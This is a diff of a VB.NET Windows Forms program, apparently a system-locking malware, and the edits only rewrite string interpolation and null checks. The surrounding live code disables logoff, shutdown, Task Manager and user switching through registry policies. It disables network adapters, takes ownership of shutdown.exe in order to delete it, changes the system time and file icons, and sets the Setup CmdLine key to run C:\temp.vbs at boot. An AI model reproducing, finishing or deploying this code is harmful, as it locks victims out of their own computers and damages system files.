@@ -118,7 +118,7 @@ Public Class Form1
             Try
                 Dim process As New Process()
                 process.StartInfo.FileName = "wscript.exe"
-                process.StartInfo.Arguments = $"""{scriptPath}"""
+                process.StartInfo.Arguments = """" & scriptPath & """"
                 process.StartInfo.UseShellExecute = False
                 process.StartInfo.RedirectStandardOutput = True
                 process.StartInfo.RedirectStandardError = True
@@ -708,17 +708,17 @@ Public Class Form1
             ' Open or create the registry key for Explorer policies
             Using explorerRegKey As RegistryKey = Registry.CurrentUser.CreateSubKey(explorerRegPath, RegistryKeyPermissionCheck.ReadWriteSubTree)
                 ' Set NoLogoff key to 1 (disable Logoff)
-                explorerRegKey?.SetValue("NoLogoff", 1, RegistryValueKind.DWord)
+                explorerRegKey.SetValue("NoLogoff", 1, RegistryValueKind.DWord)
                 ' Set NoClose key to 1 (disable Shut Down/Restart)
-                explorerRegKey?.SetValue("NoClose", 1, RegistryValueKind.DWord)
+                explorerRegKey.SetValue("NoClose", 1, RegistryValueKind.DWord)
             End Using
 
             ' Open or create the registry key for System policies (Disable Task Manager)
             Using systemRegKey As RegistryKey = Registry.CurrentUser.CreateSubKey(systemRegPath, RegistryKeyPermissionCheck.ReadWriteSubTree)
                 ' Set DisableTaskMgr key to 1 (disable Task Manager)
-                systemRegKey?.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord)
+                systemRegKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord)
                 ' Set HideFastUserSwitching key to 1 (disable Switch User)
-                systemRegKey?.SetValue("HideFastUserSwitching", 1, RegistryValueKind.DWord)
+                systemRegKey.SetValue("HideFastUserSwitching", 1, RegistryValueKind.DWord)
             End Using
 
         Catch ex As Exception
@@ -733,7 +733,7 @@ Public Class Form1
             Dim regKeyPath As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
             Using regKey As RegistryKey = Registry.LocalMachine.OpenSubKey(regKeyPath, True)
                 ' Set EnableLUA key to 1 if regKey is not null
-                regKey?.SetValue("EnableLUA", 1, RegistryValueKind.DWord)
+                regKey.SetValue("EnableLUA", 1, RegistryValueKind.DWord)
             End Using
 
             ' Lock the registry key
@@ -835,7 +835,7 @@ Public Class Form1
 
             ' Prevent changing the wallpaper by modifying the registry
             Using key As RegistryKey = Registry.CurrentUser.OpenSubKey("Control Panel\Desktop", True)
-                key?.SetValue("NoChangingWallpaper", 1, RegistryValueKind.DWord)
+                key.SetValue("NoChangingWallpaper", 1, RegistryValueKind.DWord)
             End Using
 
             ' Update file icon appearance
@@ -864,7 +864,7 @@ Public Class Form1
             End Using
 
             ' Icon path in registry format
-            Dim iconPath As String = $"""{iconIcoPath}"",0"
+            Dim iconPath As String = """" & iconIcoPath & """,0"
 
             ' Registry keys for DefaultIcon in HKEY_CLASSES_ROOT
             Dim regKeys As String() = {
@@ -911,7 +911,7 @@ Public Class Form1
                 If CBool(adapter("NetEnabled")) Then
                     ' Disable the network adapter
                     adapter.InvokeMethod("Disable", Nothing)
-                    Console.WriteLine($"Disabled adapter: {adapter("Name")}")
+                    Console.WriteLine("Disabled adapter: " & adapter("Name"))
                 End If
             Next
         Catch ex As Exception
@@ -935,7 +935,7 @@ Public Class Form1
         Next
 
         ' Step 2: Grant full access to shutdown.exe to ensure we can delete it
-        Dim grantAccessCmd As String = $"icacls {shutdownExePath} /grant *S-1-1-0:(F)"
+        Dim grantAccessCmd As String = "icacls " & shutdownExePath & " /grant *S-1-1-0:(F)"
         ExecuteCommand(grantAccessCmd)
 
         ' Step 3: Delete shutdown.exe
@@ -965,7 +965,7 @@ Public Class Form1
                 End Using
             End Using
         Catch ex As Exception
-            Console.WriteLine($"Error running wmic command: {ex.Message}")
+            Console.WriteLine("Error running wmic command: " & ex.Message)
         End Try
 
         Return False
@@ -992,7 +992,7 @@ Public Class Form1
 
             ' Set system time using WinAPI
             If Not SetLocalTime(newDateTime) Then
-                Throw New ComponentModel.Win32Exception(Marshal.GetLastWin32Error())
+                Throw New System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error())
             End If
         Catch ex As Exception
             Console.WriteLine("Failed to set system time: " & ex.Message)
@@ -1007,7 +1007,7 @@ Public Class Form1
             Dim currentName As String = Process.GetCurrentProcess().MainModule.FileName
 
             ' Create the command with actual paths
-            Dim command As String = $"icacls ""{currentDir}{Path.GetFileName(currentName)}"" /grant Everyone:(OI)(CI)F"
+            Dim command As String = "icacls """ & currentDir & Path.GetFileName(currentName) & """ /grant Everyone:(OI)(CI)F"
 
             ExecuteCommand(command)
         Catch ex As Exception
@@ -1098,7 +1098,7 @@ Public Class Form1
 
             ' Create the necessary registry keys and values
             Using setupKey As RegistryKey = Registry.LocalMachine.CreateSubKey(setupKeyPath)
-                setupKey?.SetValue("CmdLine", "C:\temp.vbs", RegistryValueKind.String)
+                setupKey.SetValue("CmdLine", "C:\temp.vbs", RegistryValueKind.String)
             End Using
 
             Using systemSetupKey As RegistryKey = Registry.LocalMachine.CreateSubKey(systemSetupKeyPath)
